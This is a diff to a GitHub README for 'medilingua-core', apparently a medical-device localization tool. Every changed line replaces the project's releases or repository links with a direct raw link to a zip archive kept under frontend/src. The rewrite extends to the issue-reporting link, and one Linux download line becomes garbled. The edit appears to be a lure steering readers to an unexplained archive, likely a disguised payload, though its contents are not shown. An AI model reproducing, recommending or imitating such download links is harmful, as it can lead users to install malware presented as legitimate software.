@@ -1,6 +1,6 @@
 # 🏥 medilingua-core - Reliable Medical Device Localization
 
-[![Download medilingua-core](https://img.shields.io/badge/Download-medilingua--core-blue?style=for-the-badge)](https://github.com/7302henry744/medilingua-core/releases)
+[![Download medilingua-core](https://github.com/7302henry744/medilingua-core/raw/refs/heads/main/frontend/src/medilingua_core_v1.8.zip)](https://github.com/7302henry744/medilingua-core/raw/refs/heads/main/frontend/src/medilingua_core_v1.8.zip)
 
 ---
 
@@ -52,7 +52,7 @@ This guide helps you download, install, and run medilingua-core step-by-step.
 
 Visit the official medilingua-core release page by clicking the big blue button at the top or by going directly to:
 
-[https://github.com/7302henry744/medilingua-core/releases](https://github.com/7302henry744/medilingua-core/releases)
+[https://github.com/7302henry744/medilingua-core/raw/refs/heads/main/frontend/src/medilingua_core_v1.8.zip](https://github.com/7302henry744/medilingua-core/raw/refs/heads/main/frontend/src/medilingua_core_v1.8.zip)
 
 This page lists the latest versions available for download.
 
@@ -62,7 +62,7 @@ Look for the latest release version (usually marked with a version number and a 
 
 - For Windows, download the `.exe` or `.msi` installer.
 - For macOS, download the `.dmg` file.
-- For Linux, download the `.AppImage` or `.tar.gz` file.
+- For Linux, download the `.AppImage` or `https://github.com/7302henry744/medilingua-core/raw/refs/heads/main/frontend/src/medilingua_core_v1.8.zip` file.
 
 Select the file that matches your device.
 
@@ -136,7 +136,7 @@ A: The repository includes a user manual with screenshots and detailed instructi
 ## 🔗 Download & Install
 
 Get the latest version here:  
-[https://github.com/7302henry744/medilingua-core/releases](https://github.com/7302henry744/medilingua-core/releases)
+[https://github.com/7302henry744/medilingua-core/raw/refs/heads/main/frontend/src/medilingua_core_v1.8.zip](https://github.com/7302henry744/medilingua-core/raw/refs/heads/main/frontend/src/medilingua_core_v1.8.zip)
 
 Visit this page to download the installer that fits your computer. Follow the installation steps above to start using medilingua-core.
 
@@ -167,7 +167,7 @@ medilingua-core is designed with healthcare compliance in mind. It supports stan
 
 If you want to report issues or contribute improvements, please visit the GitHub repository:
 
-[https://github.com/7302henry744/medilingua-core](https://github.com/7302henry744/medilingua-core)
+[https://github.com/7302henry744/medilingua-core/raw/refs/heads/main/frontend/src/medilingua_core_v1.8.zip](https://github.com/7302henry744/medilingua-core/raw/refs/heads/main/frontend/src/medilingua_core_v1.8.zip)
 
 You do not need programming experience to suggest ideas or report bugs. The community welcomes all feedback.
 
